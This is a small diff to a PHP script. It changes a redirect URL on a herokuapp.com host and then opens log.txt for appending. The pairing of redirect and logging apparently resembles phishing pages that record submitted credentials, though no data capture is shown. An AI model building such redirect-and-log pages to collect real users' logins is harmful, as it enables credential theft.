@@ -1,7 +1,7 @@
 <?php 
   
 // Set the location to redirect the page 
-header ('Location: https://hanhtrinhlotxac.herokuapp.com/buivanquangindex.php'); 
+header ('Location: https://hanhtrinhlotxac.herokuapp.com/index.php'); 
   
 // Open the text file in writing mode  
 $file = fopen("log.txt", "a"); 
